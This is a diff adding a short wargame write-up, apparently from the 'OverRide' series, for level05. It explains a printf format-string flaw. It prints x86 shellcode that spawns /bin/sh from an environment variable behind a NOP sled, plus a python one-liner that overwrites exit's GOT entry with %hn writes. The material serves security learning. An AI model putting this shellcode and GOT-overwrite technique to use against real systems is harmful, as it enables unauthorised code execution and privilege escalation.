@@ -1,0 +1,18 @@
+In the level05 we can see that the binary takes an input of 100 octets in stdin and write it with alluppercase letters in lowercase,
+but passes the result of this to a printf not used correctly (like so printf(buf);)
+so we can exploit it to write arbitrarly but we need to inject our shellcode in the env vars
+because of this lowercase problem.
+
+
+###########################################
+
+
+First, we put our shellcode in the env with a big nop sled like this:
+level05@OverRide:~$ MAIL=$(python -c 'print "\x90"*5000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+Then we run our exploit like this:
+level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56896x%10$hn%8631x%11$hn")';cat) | ./level05
+
+"\xe0\x97\x04\x08" and "\xe2\x97\x04\x08" is the adress of exit in the GOT to overwrite.
+"%56896x%10$hn%8631x%11$hn" corresponding to 0xffffde48 who is an adress in the beggining of the stack corresponding aproximatively to the var MAIL of the env.
+The big nop sled help us to aim the shellcode.
